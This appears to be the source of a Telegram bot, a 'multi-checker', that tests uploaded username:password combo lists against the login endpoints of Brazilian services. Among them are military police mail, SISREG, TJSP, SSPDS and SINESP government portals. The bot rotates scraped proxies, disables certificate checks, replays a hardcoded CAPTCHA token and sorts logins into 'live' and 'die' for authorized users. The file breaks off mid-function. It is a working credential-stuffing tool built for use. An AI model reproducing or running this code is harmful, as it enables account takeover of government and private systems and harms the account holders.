#!/usr/bin/env python3
"""
Telegram Multi-Checker Bot · by slownx
python-telegram-bot >= 20.x
"""

import asyncio
import gzip as gzip_mod
import hashlib
import json
import logging
import os
import random
import sqlite3
import time
from pathlib import Path

import requests
import urllib3
from bs4 import BeautifulSoup
from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    ApplicationHandlerStop,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

load_dotenv()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.WARNING)

# ── Config ──────────────────────────────────────────────────────────────────────
TOKEN    = os.environ["BOT_TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])
DB_PATH  = "bot.db"
TMP_DIR  = Path("tmp")
TMP_DIR.mkdir(exist_ok=True)

CHOOSE_CHECKER, WAIT_FILE, CHOOSE_DELIM = range(3)

CHECKERS = {
    "checkok":       "CheckOK",
    "consultcenter": "ConsultCenter",
    "credicorp":     "Credicorp",
    "correiopmsp":   "Correio PMSP",
    "sisreg":        "SISREG III",
    "tjsp":          "TJSP",
    "sspds":         "SSPDS CE",
    "checkonn":      "CheckONN",
    "sinesp":        "SINESP",
}

# ── Database ────────────────────────────────────────────────────────────────────
def db_init():
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id   INTEGER PRIMARY KEY,
                username  TEXT    DEFAULT '',
                full_name TEXT    DEFAULT '',
                is_auth   INTEGER DEFAULT 0,
                added_at  TEXT    DEFAULT (datetime('now')),
                threads   INTEGER DEFAULT 1
            );
            CREATE TABLE IF NOT EXISTS permissions (
                user_id INTEGER,
                checker TEXT,
                enabled INTEGER DEFAULT 0,
                PRIMARY KEY (user_id, checker)
            );
            CREATE TABLE IF NOT EXISTS user_proxies (
                user_id INTEGER PRIMARY KEY,
                proxies TEXT    DEFAULT ''
            );
        """)
        # Safe migration for existing DBs without threads column
        cols = [r[1] for r in c.execute("PRAGMA table_info(users)").fetchall()]
        if "threads" not in cols:
            c.execute("ALTER TABLE users ADD COLUMN threads INTEGER DEFAULT 1")

def _db(q, *args, fetch=None):
    with sqlite3.connect(DB_PATH) as c:
        cur = c.execute(q, args)
        if fetch == "one": return cur.fetchone()
        if fetch == "all": return cur.fetchall()

def is_admin(uid): return uid == ADMIN_ID

def ensure_user(uid, username, full_name):
    _db("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?,?,?)",
        uid, username or "", full_name or "")
    _db("UPDATE users SET username=?, full_name=? WHERE user_id=?",
        username or "", full_name or "", uid)

def is_auth(uid):
    if is_admin(uid): return True
    r = _db("SELECT is_auth FROM users WHERE user_id=?", uid, fetch="one")
    return bool(r and r[0])

def authorize_user(uid, val: bool):
    _db("INSERT OR IGNORE INTO users (user_id) VALUES (?)", uid)
    _db("UPDATE users SET is_auth=? WHERE user_id=?", 1 if val else 0, uid)

def get_user_checkers(uid):
    if is_admin(uid): return list(CHECKERS.keys())
    rows = _db("SELECT checker FROM permissions WHERE user_id=? AND enabled=1", uid, fetch="all")
    return [r[0] for r in rows] if rows else []

def toggle_checker(uid, checker):
    cur = _db("SELECT enabled FROM permissions WHERE user_id=? AND checker=?", uid, checker, fetch="one")
    if cur is None:
        _db("INSERT INTO permissions (user_id, checker, enabled) VALUES (?,?,1)", uid, checker)
        return True
    new = 0 if cur[0] else 1
    _db("UPDATE permissions SET enabled=? WHERE user_id=? AND checker=?", new, uid, checker)
    return bool(new)

def list_users():
    return _db("SELECT user_id, username, full_name, is_auth FROM users ORDER BY added_at DESC", fetch="all") or []

def get_user_proxies(uid):
    r = _db("SELECT proxies FROM user_proxies WHERE user_id=?", uid, fetch="one")
    if not r or not r[0]: return []
    return [l.strip() for l in r[0].splitlines() if l.strip()]

def set_user_proxies(uid, text: str):
    _db("INSERT OR REPLACE INTO user_proxies (user_id, proxies) VALUES (?,?)", uid, text)

def get_user_threads(uid):
    if is_admin(uid): return 5
    r = _db("SELECT threads FROM users WHERE user_id=?", uid, fetch="one")
    return r[0] if r and r[0] else 1

def set_user_threads(uid, n: int):
    _db("UPDATE users SET threads=? WHERE user_id=?", n, uid)

# ── Proxy helpers ───────────────────────────────────────────────────────────────
def _proxy_for(uid):
    lst = get_user_proxies(uid)
    if not lst: return None
    p = random.choice(lst)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ── Checker functions ───────────────────────────────────────────────────────────
# Each returns ("live"|"die"|"nvinculado"|"erro", extra_str)

def _chk_checkok(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://bff.checkok.com.br/auth/rok",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            },
            data=f'{{"username":"{user}","password":"{pwd}"}}',
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        return ("live", "") if "negado" not in r.text else ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_consultcenter(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://sistema.consultcenter.com.br/users/login",
            headers={
                "accept": "text/html,application/xhtml+xml,*/*",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://sistema.consultcenter.com.br",
                "referer": "https://sistema.consultcenter.com.br/users/login",
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
            },
            data=(
                "_method=POST"
                "&data%5B_Token%5D%5Bkey%5D=6433384afa2746bb58b2a03ca3e1311f4b80152b5a4105271287fd9ef9cc3c8cf954286b233895a7aeea65b78162811ea2d6ade92e08fa08b5e44a68db0718cd"
                f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
                f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
            ),
            proxies=px_fn(), timeout=15,
        )
        html = r.text.lower()
        if "senha incorretos" not in html and "bloqueado" not in html:
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_credicorp(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://credicorp-backend.confirmeonline.com.br/credicorp/api/user/authenticate",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0",
            },
            json={"login": user, "password": pwd, "productId": "84"},
            proxies=px_fn(), timeout=30,
        )
        details = r.json().get("details", [])
        if details and details[0].get("action", {}).get("temporaryToken"):
            return ("live", "token")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_correiopmsp(user, pwd, px_fn):
    try:
        r = requests.post(
            "https://correio.policiamilitar.sp.gov.br/names.nsf?Login",
            headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
            },
            data=(
                f"%25%25ModDate=0000000000000004&Username={user}&Password={pwd}"
                "&RedirectTo=%2F&Query_String_Decoded=Login&RedirectTo=%2F"
                "&ReasonText=&%24PublicAccess=1&reasonType=0"
            ),
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        if "Senha" not in r.text and "bloqueada" not in r.text:
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_sisreg(user, pwd, px_fn):
    try:
        h = hashlib.sha256(pwd.encode()).hexdigest()
        r = requests.post(
            "https://sisregiii.saude.gov.br/",
            headers={
                "accept": "text/html,application/xhtml+xml,*/*",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            },
            data={"usuario": user, "senha": "", "senha_256": h, "etapa": "ACESSO", "logout": ""},
            proxies=px_fn(), allow_redirects=False, timeout=15,
        )
        div = BeautifulSoup(r.text, "html.parser").find("div", {"id": "mensagem"})
        msg = div.get_text(strip=True) if div else ""
        if "incorreto" in msg or "desativado" in msg:
            return ("die", "")
        return ("live", msg or f"status {r.status_code}")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_tjsp(user, pwd, px_fn):
    try:
        PARAMS = {"ReturnUrl": (
            "/rhf/acesso/wsfederation?wtrealm=https%3a%2f%2fwww.tjsp.jus.br%2fRHF%2fPortalServidor%2f"
            "&wctx=WsFedOwinState%3dZ3yVUTwekdJqiwXg49Psp9Uwsbk_KiM9ulcMcto47n8&wa=wsignin1.0"
        )}
        HG = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/149.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*",
        }
        HP = {
            **HG,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.tjsp.jus.br",
            "Referer": "https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
        }
        s  = requests.Session()
        px = px_fn()
        pg = s.get("https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
                   params=PARAMS, headers=HG, proxies=px, timeout=30)
        inp = BeautifulSoup(pg.text, "html.parser").find("input", {"name": "__RequestVerificationToken"})
        if not inp:
            return ("erro", "sem CSRF")
        resp = s.post(
            "https://www.tjsp.jus.br/rhf/acesso/Login/SignIn",
            params=PARAMS, headers=HP,
            data={"__RequestVerificationToken": inp["value"],
                  "Usuario": user, "Senha": pwd, "Lembrar": "false"},
            proxies=px, timeout=30, allow_redirects=False,
        )
        if resp.status_code == 302 and "wsfederation" in resp.headers.get("Location", ""):
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

def _chk_sspds(user, pwd, px_fn):
    try:
        H = {
            "accept": "text/html,application/xhtml+xml,*/*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://consulta.sspds.ce.gov.br",
            "referer": "https://consulta.sspds.ce.gov.br/consulta/index.do",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36",
        }
        s  = requests.Session()
        px = px_fn()
        s.get("https://consulta.sspds.ce.gov.br/consulta/index.do",
              headers=H, proxies=px, timeout=15, verify=False)
        r = s.post(
            "https://consulta.sspds.ce.gov.br/consulta/logon.do",
            headers=H,
            data={"username": user, "password": pwd, "appNameBrowser": "Netscape", "submit": " OK "},
            proxies=px, timeout=15, verify=False,
        )
        if any(k in r.text for k in ("logoff.do", "editSenha.do", "consultaNomeForm")):
            return ("live", "")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

_SINESP_DISP = "2412DPC0AG"
_SINESP_INST = "ed5f8007-7d67-409f-afce-2e8fc7e7e059"

def _chk_sinesp(user, pwd, px_fn):
    try:
        digits  = "".join(filter(str.isdigit, user))
        usuario = digits if len(digits) == 11 else user
        body = json.dumps({
            "aplicativo": "APP_AGENTE_CAMPO",
            "dispositivo": _SINESP_DISP,
            "instalacao":  _SINESP_INST,
            "senha":       pwd,
            "usuario":     usuario,
        }, separators=(",", ":")).encode("utf-8")
        http = urllib3.HTTPSConnectionPool(
            "seguranca.sinesp.gov.br", port=443,
            cert_reqs="CERT_NONE", assert_hostname=False,
            timeout=urllib3.Timeout(connect=15, read=30),
        )
        resp = http.urlopen(
            "POST",
            "/sinesp-seguranca/api/sessao_autenticada/mobile",
            body=body,
            headers={
                "host":            "seguranca.sinesp.gov.br",
                "content-type":    "application/json; charset=UTF-8",
                "content-length":  str(len(body)),
                "accept-encoding": "gzip",
                "user-agent":      "okhttp/3.14.9",
            },
            preload_content=True,
        )
        raw = resp.data
        if resp.headers.get("content-encoding") == "gzip":
            raw = gzip_mod.decompress(raw)
        text = raw.decode("utf-8", errors="replace")
        if "MOB411" in text:
            return ("die", "")
        if "Usuário não vinculado ao sistema" in text:
            return ("nvinculado", "")
        data  = json.loads(text)
        token = data.get("token")
        if resp.status == 200 and token and token != "null":
            return ("live", f"token:{str(token)[:20]}...")
        return ("die", "")
    except Exception as e:
        return ("erro", str(e)[:60])

_CHECKONN_CAP = (
    "0cAFcWeA6-VItkOKwH4qO_GB7Tf2ftDzZmkLq9WNjes3aFQ_Z1zsy582pFybIczVJxtnQTBUYhw6_ASRtuCat2cR9snyQMXQKjwFEQuh"
    "MtxaeoUuZvrjLixEGqY0P6SA6tc_3lmJimjf7qLRq9CLB2pnKFwYkFQtspKxH-1u6b07bfGSknadx8nTYWwq4GukxCkQ_pLMZpHSMECs"
    "9WWbz2bLiu0H_8CE1W7JqEU7efXyD7Dluca4J15UKjRF6idEXHntWdRR27CGxSKBcg42LG_d4PQ53a7IiqnGX4fiUQ7sZzIocvB2AO4xD"
    "4TedEVU5fqkmkjWwnsP6wH9nlKoOUN9tPzFvaTfU4rj1hTzMoDTWcjACynuK64qNDzYOBvcXHISvQILPdncxM8nuc-BdjDWL2-3u87v2p"
    "p4eHoWcqqM4m3zVw1HBb5T7G-ZzhTh7QCKW-WbfTMxfCB2HBIxN-eKD8OeYek2fLzEnAPekhT3ZB26ct3enKBG83sQpa1lM1827665O3"
    "uBnvcnN1SR8jy5ZFHBbiy1bq0-HUWUgyyGvhUXi7CfK7wd-nvhshyXfy_FB1JbdAvbMsi4KcdMQaIP1C9b_hOyypMheCGclhOS6j7stRv"
    "gWp1wPpGB_6HAv75YkWwdC6BW49xMHosaiyRygpmsBLFSjzjvBAa3cK65oUetEO27PVwkTbAebJljMSloY8GongiEe25af8pXVuR3HT20G"
    "mwWzUGne38QTlYjPPuk7QywxQ7qDkxXFu18dj5MCYYSWo6H-0A0WeUtE2jqesDa0DPP8pWbz00Vwv530h99FpSvXPLrjCKZPpNmLxyWe4"
    "w4ObvCIDI2rP-l9C0sz5pywfE5HzbiPX-B1tNNvIXd_QDB8ahT39QVhtuRDfWyNBIMz3cMNEmstLImunhhi6ozvMQf-OKGhQAIAxeJtmly"
    "x7MQwCIIEjKNDWSFIe6EifyqAnRr8ihdA-KMVv8BLZWTBEDBqMVU79LOHhfhXt6WHWRZ63M1HVhTfXZuUTZw1cf3X8scETgH5ES0bMCkK"
    "Fw15sZ5befhDMc67uZJqqZACd07dYrP0Tif0XqtJPFv5LdWxbrmzdJSzeJUT2mYggOi8MjwcZV0emn70HL5oN5ZsPZZYIconImo6TXZkYv"
    "jveKHlhPIx0tSYkxDmg9c9FwZWqzkeOr2876QY7fZKY46wyhpgmPKO68HCudmUmE8iauQwbzQz1s_fCcWKCOEgQ6C3QP7YLKgp1yU4b0R"
    "16OhcdIHUJLH3wyAqxwsin6e5ly0sPt4XANa7VtM2xHkheOlK3ttu5qWPbmcWgPrQuiosmwoYQYMY0CfibTvvQShzFLWk8coZBBcvTEjfi"
    "-_vz6gSwc0r_lgEIrf_21CRs9xACr8E3qj92q2WAR57wtIDNmb8a6h4BLP0_ZF9BgF2coD2ry5KqL_OkVCvfJpTekw0tWB_xIWo_xzM01K"
    "iNOgYJ2bYZxiMdTXtSuwP2eKvYqlEfNC01lpXi22yT-uAzoQx-UVuC9ir0rY45jnJiW4RrJ2MMG_yATZO3mmEVp5c2uiX2ys7OVx39mAnC"
    "UTDBdyPRIl_GnNFCPYjlUlJt6r5hTT4mR7YkfXt_BygxGtir0CZXpTGQyxoqaCyh01XjDrAJ298Ca9mqa57o7dhgCbSpYen4A8wjXBT7fF"
    "C8YOxkBhxY5Sk4gZMSNVb0zk_ZLfiKbS7aHjJQT23kJQEH7R7CLYA3zfnJRe2lf2gnaI02lRzP5asPEMcKwtO0gGkK_yi9NuDP4mNSBrj"
    "yeimmITgjXwKr_Zntct8zbD7UKIaG81dqCcQ61kZCbZKeMPaXkBNKgV2J5V_RLpTABx0kAsHSqQaUPcrr_rD--u-v7BFqsg6rOmR_Ou2X0"
    "Pp_iU-nzFrIKlvKzGAxHAc3QLRf0zUY2Z2dwrMXV21X7G0LG3kPy6p77vtkGr6TXLmbvvpWvJW1ZvIjl1g5rU0PW9xQEwQvni0_oh2U_4Y"
    "sMD9ERFyV_1TiDUXDZH3RzJScs-fNHqrr3sdEQGKbuQDcfXSvt6YshWKdgkqyHfYXotlktshX6J0Sns2GlK2xoJ9Q4tVnW1--tvGtlgcZUG"
    "3bnA4k2gU605YWXz01S1cR66D_1vGOo_mVRrX5FjP8HwoQbJfdCjX43hPDlOmv3_FpStwuZTS1Nb3lpu3K"
)

def _chk_checkonn(user, pwd, px_fn):
    try:
        H = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "pt-BR,pt;q=0.9",
            "origin": "https://app.checkonn.com",
            "referer": "https://app.checkonn.com/intranet/login.php",
            "upgrade-insecure-requests": "1",
        }
        s  = requests.Session()
        px = px_fn()
        s.headers.update(H)
        s.get("https://app.checkonn.com/", proxies=px, timeout=10, verify=False)
        s.get("https://app.checkonn.com/intranet/login.php", proxies=px, timeout=10, verify=False)
        r = s.post(
            "https://app.checkonn.com/intranet/login.php",
            data={"login": user, "senha": pwd, "logar": "true",
                  "g-recaptcha-response": _CHECKONN_CAP, "loginEsqueci": ""},
            proxies=px, timeout=10, verify=False, allow_redirects=True,
        )
        is_die = (
            "Senha inválida." in r.text
            or "tentativas restantes!" in r.text
            or "Login inválido" in r.text
            or "login bloqueado!" in r.text.lower()
        )
        return ("die", "") if is_die else ("live", "")
    except Exception as e:
        return ("erro", str(e)[:60])

CHECKER_FN = {
    "checkok":       _chk_checkok,
    "consultcenter": _chk_consultcenter,
    "credicorp":     _chk_credicorp,
    "correiopmsp":   _chk_correiopmsp,
    "sisreg":        _chk_sisreg,
    "tjsp":          _chk_tjsp,
    "sspds":         _chk_sspds,
    "checkonn":      _chk_checkonn,
    "sinesp":        _chk_sinesp,
}

# ── Proxy generator (admin only) ────────────────────────────────────────────────
_FONTES_TXT = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=BR&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=http&country=BR",
    "https://www.proxy-list.download/api/v1/get?type=https&country=BR",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]
_FONTES_JSON = [
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
    "https://proxylist.geonode.com/api/proxy-list?country=BR&limit=500&page=2&sort_by=lastChecked&sort_type=desc&protocols=http,https,socks4,socks5",
]

def _fetch_proxies():
    found = set()
    for url in _FONTES_TXT:
        try:
            r = requests.get(url, timeout=15)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if ":" in line and line.count(".") == 3:
                    found.add(line)
        except Exception:
            pass
    for url in _FONTES_JSON:
        try:
            r = requests.get(url, timeout=15)
            for item in r.json().get("data", []):
                ip, port = item.get("ip", ""), item.get("port", "")
                if ip and port:
                    found.add(f"{ip}:{port}")
        except Exception:
            pass
    return list(found)

def _check_proxy_alive(proxy):
    try:
        r = requests.get(
            "https://api.ipify.org",
            proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
            timeout=8,
        )
        return r.status_code == 200
    except Exception:
        return False

# ── Keyboards ───────────────────────────────────────────────────────────────────
def _kb_checkers(uid):
    chks = get_user_checkers(uid)
    if not chks:
        return None
    rows = []
    for i in range(0, len(chks), 2):
        row = [InlineKeyboardButton(CHECKERS[chks[i]], callback_data=f"chk:{chks[i]}")]
        if i + 1 < len(chks):
            row.append(InlineKeyboardButton(CHECKERS[chks[i + 1]], callback_data=f"chk:{chks[i + 1]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton("❌ Cancelar", callback_data="chk:cancel")])
    return InlineKeyboardMarkup(rows)

def _kb_delim():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("  :  ", callback_data="dl::"),
            InlineKeyboardButton("  ;  ", callback_data="dl:;"),
            InlineKeyboardButton("  |  ", callback_data="dl:|"),
        ],
        [InlineKeyboardButton("❌ Cancelar", callback_data="dl:cancel")],
    ])

def _kb_admin():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👥 Usuários",      callback_data="adm:users"),
            InlineKeyboardButton("🌐 Gerar Proxies", callback_data="adm:proxygen"),
        ],
        [InlineKeyboardButton("📊 Status",           callback_data="adm:status")],
    ])

def _kb_users(users):
    rows = []
    for uid, uname, fname, is_a in users:
        label = f"{'✅' if is_a else '❌'}  {fname or uname or uid}"
        rows.append([InlineKeyboardButton(label, callback_data=f"usr:{uid}")])
    rows.append([InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
    return InlineKeyboardMarkup(rows)

def _kb_manage(target_uid, is_a):
    rows = []

    # Auth toggle
    rows.append([InlineKeyboardButton(
        "🔴 Revogar acesso" if is_a else "🟢 Autorizar acesso",
        callback_data=f"auth:{target_uid}:{'0' if is_a else '1'}",
    )])

    # Thread control
    current_threads = get_user_threads(target_uid)
    thread_row = []
    for n in [1, 2, 3, 5]:
        icon = "🔵" if current_threads == n else "⚪"
        thread_row.append(InlineKeyboardButton(f"{icon}{n}T", callback_data=f"thd:{target_uid}:{n}"))
    rows.append(thread_row)

    # Checker permissions
    perm_rows = _db("SELECT checker, enabled FROM permissions WHERE user_id=?", target_uid, fetch="all") or []
    perm_map  = {r[0]: r[1] for r in perm_rows}
    btns = [
        InlineKeyboardButton(
            f"{'✅' if perm_map.get(k, 0) else '➕'}  {name}",
            callback_data=f"perm:{target_uid}:{k}",
        )
        for k, name in CHECKERS.items()
    ]
    for i in range(0, len(btns), 2):
        row = [btns[i]]
        if i + 1 < len(btns):
            row.append(btns[i + 1])
        rows.append(row)

    # Delete user proxies
    px_count = len(get_user_proxies(target_uid))
    rows.append([InlineKeyboardButton(
        f"🗑️ Limpar proxies ({px_count})" if px_count else "🗑️ Sem proxies (vazio)",
        callback_data=f"delpx:{target_uid}",
    )])

    rows.append([InlineKeyboardButton("🔙 Usuários", callback_data="adm:users")])
    return InlineKeyboardMarkup(rows)

# ── Command handlers ────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)

    if not is_auth(uid):
        await update.message.reply_text(
            f"⛔ *Acesso negado.*\nSolicite acesso ao admin.\n\n`Seu ID: {uid}`",
            parse_mode="Markdown",
        )
        return ConversationHandler.END

    chks = get_user_checkers(uid)
    if not chks:
        await update.message.reply_text("⚠️ Nenhum checker liberado. Aguarde o admin.")
        return ConversationHandler.END

    px_count = len(get_user_proxies(uid))
    px_text  = f"✅ {px_count} proxies" if px_count else "❌ sem proxies · /myproxy"
    await update.message.reply_text(
        f"🔍 *Escolha o checker:*\n\n🌐 {px_text}",
        parse_mode="Markdown",
        reply_markup=_kb_checkers(uid),
    )
    return CHOOSE_CHECKER

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    total  = len(list_users())
    authed = sum(1 for u in list_users() if u[3])
    await update.message.reply_text(
        f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
        parse_mode="Markdown",
        reply_markup=_kb_admin(),
    )

async def cmd_myproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_auth(uid):
        return
    px_count = len(get_user_proxies(uid))
    ctx.user_data["waiting_proxy"] = True
    status = f"✅ {px_count} proxies ativos" if px_count else "❌ Sem proxies"
    kb = None
    if px_count:
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("🗑️ Limpar proxies", callback_data="px:clear")
        ]])
    await update.message.reply_text(
        f"🌐 *Gerenciar Proxies*\n{status}\n\nEnvie um arquivo *.txt* com proxies (`ip:porta` por linha).",
        parse_mode="Markdown",
        reply_markup=kb,
    )

async def cmd_perfil(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)
    px_count = len(get_user_proxies(uid))

    if is_admin(uid):
        users  = list_users()
        authed = sum(1 for x in users if x[3])
        await update.message.reply_text(
            f"👑 *Perfil Admin*\n"
            f"```\n"
            f"Nome     : {u.full_name or u.username or uid}\n"
            f"ID       : {uid}\n"
            f"Threads  : ilimitado\n"
            f"Proxies  : {px_count}\n"
            f"Usuários : {len(users)}\n"
            f"Auth     : {authed}\n"
            f"```",
            parse_mode="Markdown",
        )
        return

    row = _db("SELECT username, full_name, is_auth, added_at, threads FROM users WHERE user_id=?", uid, fetch="one")
    if not row:
        await update.message.reply_text("❌ Usuário não encontrado.")
        return
    uname, fname, is_a, added_at, threads = row
    chks     = get_user_checkers(uid)
    chk_list = ", ".join(CHECKERS[k] for k in chks) if chks else "nenhum"
    await update.message.reply_text(
        f"👤 *Meu Perfil*\n"
        f"```\n"
        f"Nome     : {fname or uname or uid}\n"
        f"ID       : {uid}\n"
        f"Status   : {'✅ Autorizado' if is_a else '❌ Bloqueado'}\n"
        f"Threads  : {threads or 1}\n"
        f"Proxies  : {px_count}\n"
        f"Checkers : {chk_list}\n"
        f"Desde    : {(added_at or '')[:10] or 'N/A'}\n"
        f"```",
        parse_mode="Markdown",
    )

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tmp = ctx.user_data.pop("tmp_file", None)
    if tmp:
        Path(tmp).unlink(missing_ok=True)
    ctx.user_data.clear()
    await update.message.reply_text("❌ Cancelado.")
    return ConversationHandler.END

# ── Proxy document handler (runs in group -1, BEFORE the conversation) ──────────
async def handle_proxy_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Intercepts document uploads when waiting_proxy is set, before the conv handler."""
    if not ctx.user_data.get("waiting_proxy"):
        return  # not for us — let the conv handler proceed

    uid = update.effective_user.id
    if not is_auth(uid):
        ctx.user_data.pop("waiting_proxy", None)
        raise ApplicationHandlerStop

    ctx.user_data.pop("waiting_proxy")
    doc = update.message.document
    f   = await doc.get_file()
    tmp = TMP_DIR / f"proxy_{uid}.txt"
    await f.download_to_drive(str(tmp))
    text  = tmp.read_text(encoding="utf-8", errors="ignore")
    tmp.unlink(missing_ok=True)

    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        await update.message.reply_text("⚠️ Arquivo vazio ou sem proxies válidos.")
        raise ApplicationHandlerStop

    ctx.user_data["pending_proxies"] = text
    await update.message.reply_text(
        f"📋 *{len(lines)} proxies encontrados.*\nO que deseja fazer?",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔍 Testar conectividade", callback_data="px:test"),
            InlineKeyboardButton("✅ Salvar direto",        callback_data="px:save"),
        ]]),
    )
    raise ApplicationHandlerStop

# ── Proxy action callback ───────────────────────────────────────────────────────
async def on_proxy_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid    = q.from_user.id
    if not is_auth(uid):
        return
    action = q.data.split(":", 1)[1]

    if action == "clear":
        set_user_proxies(uid, "")
        await q.edit_message_text("🗑️ Proxies removidos. Checagens vão direto, sem proxy.")

    elif action == "save":
        text = ctx.user_data.pop("pending_proxies", "")
        set_user_proxies(uid, text)
        count = len([l for l in text.splitlines() if l.strip()])
        await q.edit_message_text(f"✅ {count} proxies salvos!")

    elif action == "test":
        text    = ctx.user_data.pop("pending_proxies", "")
        proxies = [l.strip() for l in text.splitlines() if l.strip()]
        if not proxies:
            await q.edit_message_text("⚠️ Nenhum proxy para testar.")
            return
        await q.edit_message_text(f"🔍 Testando {len(proxies)} proxies... aguarde ⏳")
        asyncio.create_task(_run_proxy_test(uid, proxies, q.message.chat_id, ctx.application))

# ── Document handler (inside ConversationHandler) ───────────────────────────────
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = u.id
    ensure_user(uid, u.username, u.full_name)

    if not is_auth(uid):
        await update.message.reply_text(
            f"⛔ Sem acesso. `ID: {uid}`", parse_mode="Markdown"
        )
        return ConversationHandler.END

    doc = update.message.document
    if not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text("⚠️ Envie um arquivo *.txt*", parse_mode="Markdown")
        return ConversationHandler.END

    f   = await doc.get_file()
    tmp = TMP_DIR / f"in_{uid}_{int(time.time())}.txt"
    await f.download_to_drive(str(tmp))
    ctx.user_data["tmp_file"] = str(tmp)

    # new flow: checker already chosen → ask delimiter
    if ctx.user_data.get("checker"):
        await update.message.reply_text(
            f"✅ *{CHECKERS[ctx.user_data['checker']]}*\n\n🔤 Qual o *delimitador*?",
            parse_mode="Markdown",
            reply_markup=_kb_delim(),
        )
        return CHOOSE_DELIM

    # legacy flow: file sent first → show checkers
    chks = get_user_checkers(uid)
    if not chks:
        await update.message.reply_text("⚠️ Nenhum checker liberado. Aguarde o admin.")
        return ConversationHandler.END

    await update.message.reply_text(
        "🔍 *Escolha o checker:*",
        parse_mode="Markdown",
        reply_markup=_kb_checkers(uid),
    )
    return CHOOSE_CHECKER

async def on_checker_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    val = q.data.split(":", 1)[1]

    if val == "cancel":
        tmp = ctx.user_data.pop("tmp_file", None)
        if tmp:
